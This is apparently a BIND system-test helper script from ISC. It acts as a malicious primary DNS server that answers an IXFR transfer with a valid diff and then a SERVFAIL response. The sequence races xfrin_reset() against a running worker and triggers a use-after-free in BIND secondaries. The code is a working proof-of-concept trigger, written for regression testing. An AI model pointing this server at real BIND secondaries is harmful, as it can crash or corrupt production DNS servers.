"""
Copyright (C) Internet Systems Consortium, Inc. ("ISC")

SPDX-License-Identifier: MPL-2.0

This Source Code Form is subject to the terms of the Mozilla Public
License, v. 2.0.  If a copy of the MPL was not distributed with this
file, you can obtain one at https://mozilla.org/MPL/2.0/.

See the COPYRIGHT file distributed with this work for additional
information regarding copyright ownership.
"""

import os
import signal
import socket
import struct
import sys
import threading

# DNS constants
DNS_TYPE_SOA = 6
DNS_TYPE_A = 1
DNS_TYPE_NS = 2
DNS_TYPE_AXFR = 252
DNS_TYPE_IXFR = 251
DNS_CLASS_IN = 1
DNS_FLAG_QR = 0x8000
DNS_FLAG_AA = 0x0400
DNS_RCODE_NOERROR = 0
DNS_RCODE_SERVFAIL = 2


def encode_name(name):
    """Encode a DNS name in wire format (no compression)."""
    parts = name.rstrip(".").split(".")
    result = b""
    for part in parts:
        encoded = part.encode("ascii")
        result += struct.pack("B", len(encoded)) + encoded
    result += b"\x00"
    return result


def encode_name_compressed(offset):
    """Encode a DNS name using compression pointer."""
    return struct.pack("!H", 0xC000 | offset)


def build_soa_rdata(
    mname, rname, serial, refresh=3600, retry=900, expire=604800, minimum=86400
):
    """Build SOA record rdata."""
    rdata = encode_name(mname)
    rdata += encode_name(rname)
    rdata += struct.pack("!IIIII", serial, refresh, retry, expire, minimum)
    return rdata


def build_a_rdata(ip_str):
    """Build A record rdata from dotted-quad string."""
    parts = ip_str.split(".")
    return struct.pack("4B", *[int(p) for p in parts])


def build_rr(name_bytes, rtype, rclass, ttl, rdata):
    """Build a complete resource record."""
    rr = name_bytes
    rr += struct.pack("!HHIH", rtype, rclass, ttl, len(rdata))
    rr += rdata
    return rr


def build_dns_header(qid, flags, qdcount, ancount, nscount=0, arcount=0):
    """Build DNS message header."""
    return struct.pack("!HHHHHH", qid, flags, qdcount, ancount, nscount, arcount)


def parse_dns_query(data):
    """Parse incoming DNS query, return (qid, qname, qtype, qclass)."""
    if len(data) < 12:
        return None
    qid, _, _ = struct.unpack("!HHH", data[:6])

    # Parse question
    offset = 12
    labels = []
    while offset < len(data):
        length = data[offset]
        offset += 1
        if length == 0:
            break
        if length >= 0xC0:
            # Compression pointer
            offset += 1
            break
        labels.append(data[offset : offset + length].decode("ascii"))
        offset += length

    qname = ".".join(labels) + "."

    if offset + 4 > len(data):
        return None

    qtype, qclass = struct.unpack("!HH", data[offset : offset + 4])
    return qid, qname, qtype, qclass


def build_ixfr_message1(qid, zone_name, num_records):
    """
    Build IXFR Message 1: A valid IXFR diff that triggers ixfr_commit().

    This message contains a complete diff 1 (large, many records) which
    triggers ixfr_commit() -> isc_work_enqueue() -> worker thread starts.

    The message ends with a boundary SOA that starts diff 2, so the state
    machine is in XFRST_IXFR_DEL waiting for more records.

    Answer section structure:
    1. Initial SOA (end_serial=3)   -- XFRST_ZONEXFRREQUEST
    2. Old SOA (serial=1)           -- XFRST_FIRSTDATA -> IXFR -> DELSOA
    3. DEL A records (num_records)  -- XFRST_IXFR_DEL (diffs++)
    4. Mid SOA (serial=2)           -- XFRST_IXFR_ADDSOA (diffs++)
    5. ADD A records (num_records)  -- XFRST_IXFR_ADD (diffs++)
    6. Boundary SOA (serial=2)      -- ixfr_commit()! Worker enqueued.
                                       Then goto redo -> DELSOA of diff 2
    """
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_IXFR, DNS_CLASS_IN)

    mname = "ns." + zone_name
    rname = "admin." + zone_name
    end_serial = 3
    old_serial = 1
    mid_serial = 2

    soa_end = build_soa_rdata(mname, rname, end_serial)
    soa_old = build_soa_rdata(mname, rname, old_serial)
    soa_mid = build_soa_rdata(mname, rname, mid_serial)

    records = []

    # 1. Initial SOA (end serial)
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_end))

    # 2. Old SOA (serial 1) - triggers IXFR detection
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_old))

    # 3. DEL A records
    for i in range(num_records):
        name = encode_name(f"host-{i}.{zone_name}")
        ip = f"10.0.{(i >> 8) & 0xFF}.{i & 0xFF}"
        records.append(
            build_rr(name, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata(ip))
        )

    # 4. Mid SOA (serial 2) - end of DEL, start of ADD
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_mid))

    # 5. ADD A records
    for i in range(num_records):
        name = encode_name(f"host-{i}.{zone_name}")
        ip = f"10.1.{(i >> 8) & 0xFF}.{i & 0xFF}"
        records.append(
            build_rr(name, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata(ip))
        )

    # 6. Boundary SOA (serial=2 == current_serial) -> ixfr_commit()!
    # This triggers the worker thread via isc_work_enqueue().
    # Then goto redo processes it as DELSOA of diff 2.
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_mid))

    ancount = len(records)
    answer = b"".join(records)
    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR
    header = build_dns_header(qid, flags, 1, ancount)
    msg = header + question + answer

    print(
        f"[*] Message 1: {len(msg)} bytes, {ancount} RRs "
        f"(diff 1: {num_records} DEL + {num_records} ADD)"
    )

    return msg


def build_bad_rcode_message2(qid, zone_name):
    """
    Build Message 2

    A DNS response with rcode=SERVFAIL. When BIND receives this during an
    active IXFR transfer:

    xfrin_recv_done():
      msg->rcode != dns_rcode_noerror  (SERVFAIL != NOERROR) ->
      result = dns_result_fromrcode(msg->rcode) ->
      reqtype == dns_rdatatype_ixfr (not axfr/soa) ->
      falls through to try_axfr: ->
      xfrin_reset() -> destroys journal/version

    Meanwhile ixfr_apply worker from Message 1 is still running -> UAF.

    This works with DEFAULT secondary configuration (no special options).
    """
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_IXFR, DNS_CLASS_IN)

    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_SERVFAIL
    header = build_dns_header(qid, flags, 1, 0)
    msg = header + question

    print(
        f"[*] Message 2 (bad-rcode): {len(msg)} bytes, "
        "rcode=SERVFAIL -> triggers try_axfr -> xfrin_reset()"
    )

    return msg


def build_soa_response(qid, zone_name, serial):
    """Build a SOA response for the zone."""
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_SOA, DNS_CLASS_IN)

    mname = "ns." + zone_name
    rname = "admin." + zone_name
    soa_rdata = build_soa_rdata(mname, rname, serial)
    answer = build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_rdata)

    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR
    header = build_dns_header(qid, flags, 1, 1)
    return header + question + answer


def build_axfr_response(qid, zone_name, serial, num_records):
    """
    Build a complete AXFR response for initial zone load.

    AXFR format: SOA, NS, A records, ..., SOA (trailing SOA marks end).
    """
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_AXFR, DNS_CLASS_IN)

    mname = "ns." + zone_name
    rname = "admin." + zone_name
    soa_rdata = build_soa_rdata(mname, rname, serial)

    records = []

    # Opening SOA
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_rdata))

    # NS record
    ns_wire = encode_name("ns." + zone_name)
    records.append(build_rr(zone_wire, DNS_TYPE_NS, DNS_CLASS_IN, 3600, ns_wire))

    # NS A record
    records.append(
        build_rr(ns_wire, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata("127.0.0.1"))
    )

    # A records (matching gen_zone.py output)
    for i in range(num_records):
        name = encode_name(f"host-{i}.{zone_name}")
        ip = f"10.0.{(i >> 8) & 0xFF}.{i & 0xFF}"
        records.append(
            build_rr(name, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata(ip))
        )

    # Trailing SOA (marks end of AXFR)
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_rdata))

    ancount = len(records)
    answer = b"".join(records)
    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR
    header = build_dns_header(qid, flags, 1, ancount)
    msg = header + question + answer

    print(
        f"[*] AXFR response: {len(msg)} bytes, {ancount} RRs "
        f"(serial={serial}, {num_records} A records)"
    )

    return msg


def tcp_send_message(sock, msg):
    """Send a DNS message over TCP with 2-byte length prefix."""
    length = struct.pack("!H", len(msg))
    sock.sendall(length + msg)


def tcp_recv_message(sock):
    """Receive a DNS message over TCP with 2-byte length prefix."""
    length_data = b""
    while len(length_data) < 2:
        chunk = sock.recv(2 - len(length_data))
        if not chunk:
            return None
        length_data += chunk
    length = struct.unpack("!H", length_data)[0]

    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def handle_client(conn, addr, zone_name, num_records, axfr_done_event):
    """Handle a single TCP connection from a BIND secondary."""
    print(f"[+] Connection from {addr}")

    try:
        while True:
            data = tcp_recv_message(conn)
            if data is None:
                print(f"[-] Connection closed by {addr}")
                break

            parsed = parse_dns_query(data)
            if parsed is None:
                print(f"[-] Failed to parse query from {addr}")
                break

            qid, qname, qtype, qclass = parsed
            print(f"[*] Query: {qname} type={qtype} class={qclass} id={qid}")

            if qtype == DNS_TYPE_SOA:
                # SOA query over TCP (initial or pre-transfer check)
                # Respond with serial=1 if initial AXFR not done yet,
                # serial=3 to trigger IXFR after initial load
                if axfr_done_event.is_set():
                    serial = 3
                else:
                    serial = 1
                print(f"[*] Responding with SOA serial={serial}")
                response = build_soa_response(qid, zone_name, serial)
                tcp_send_message(conn, response)

            elif qtype == DNS_TYPE_AXFR:
                # Initial AXFR to load the zone with serial=1
                print("[*] AXFR request - sending initial zone (serial=1)")
                response = build_axfr_response(qid, zone_name, 1, num_records)
                tcp_send_message(conn, response)
                axfr_done_event.set()
                print(
                    "[+] Initial AXFR complete. Zone loaded with "
                    "serial=1. Next SOA will return serial=3 to "
                    "trigger IXFR."
                )

            elif qtype == DNS_TYPE_IXFR:
                print("[*] IXFR request received")

                # Message 1: Valid IXFR diff -> triggers ixfr_commit()
                msg1 = build_ixfr_message1(qid, zone_name, num_records)

                print(f"[*] Sending Message 1 ({len(msg1)} bytes)...")
                tcp_send_message(conn, msg1)

                # Message 2: Trigger xfrin_reset() while worker is running
                msg2 = build_bad_rcode_message2(qid, zone_name)

                print(f"[*] Sending Message 2 ({len(msg2)} bytes) - triggers race!")
                tcp_send_message(conn, msg2)

                print(
                    "[+] IXFR response sent. If BIND9 is built with "
                    "TSAN, expect data race reports on "
                    "xfr->ixfr.journal and xfr->ver"
                )
            else:
                print(f"[*] Ignoring query type {qtype}")

    except (ConnectionResetError, BrokenPipeError) as e:
        print(f"[-] Connection error: {e}")
    finally:
        conn.close()
        print(f"[-] Connection to {addr} closed")


def udp_server(listen_addr, port, zone_name, axfr_done_event):
    """UDP server for SOA queries (BIND sends SOA queries over UDP first)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((listen_addr, port))
    print(f"[+] UDP listening on {listen_addr}:{port} (for SOA queries)")

    while True:
        try:
            data, addr = sock.recvfrom(4096)
            parsed = parse_dns_query(data)
            if parsed is None:
                continue

            qid, qname, qtype, qclass = parsed
            print(f"[UDP] Query from {addr}: {qname} class={qclass} type={qtype}")

            if qtype == DNS_TYPE_SOA:
                # Return serial=1 initially (matches zone), then serial=3
                # after AXFR to trigger IXFR
                if axfr_done_event.is_set():
                    serial = 3
                else:
                    serial = 1
                print(f"[UDP] Responding with SOA serial={serial}")
                response = build_soa_response(qid, zone_name, serial)
                sock.sendto(response, addr)
            elif qtype == DNS_TYPE_IXFR:
                # IXFR over UDP gets truncated response to force TCP
                print("[UDP] IXFR over UDP, sending TC=1 to force TCP")
                flags = DNS_FLAG_QR | DNS_FLAG_AA | 0x0200  # TC bit
                header = build_dns_header(qid, flags, 0, 0)
                sock.sendto(header, addr)
            else:
                print(f"[UDP] Ignoring query type {qtype}")
        except Exception as e:  # pylint: disable=broad-except
            print(f"[UDP] Error: {e}")


def sigterm(*_):
    print("SIGTERM received, shutting down")
    os.remove("ans.pid")
    sys.exit(0)


def main():
    signal.signal(signal.SIGTERM, sigterm)
    signal.signal(signal.SIGINT, sigterm)
    with open("ans.pid", "w", encoding="utf-8") as pidfile:
        print(os.getpid(), file=pidfile)

    listen = sys.argv[1]
    port = int(sys.argv[2])
    zone_name = "ixfr-race."
    num_records = 400

    # Shared event: set after initial AXFR, before IXFR
    axfr_done_event = threading.Event()

    # Start UDP server in background (for SOA queries)
    udp_thread = threading.Thread(
        target=udp_server, args=(listen, port, zone_name, axfr_done_event)
    )
    udp_thread.daemon = True
    udp_thread.start()

    # Set up TCP server (for AXFR initial load + IXFR attack)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((listen, port))
    server.listen(5)
    print(f"[+] TCP listening on {listen}:{port}")
    print()
    print("[*] Phase 1: Initial AXFR to load zone with serial=1")
    print("[*] Phase 2: SOA refresh will return serial=3 -> IXFR -> race")
    print()

    while True:
        conn, addr = server.accept()
        t = threading.Thread(
            target=handle_client,
            args=(conn, addr, zone_name, num_records, axfr_done_event),
        )
        t.daemon = True
        t.start()
    server.close()


if __name__ == "__main__":
    main()
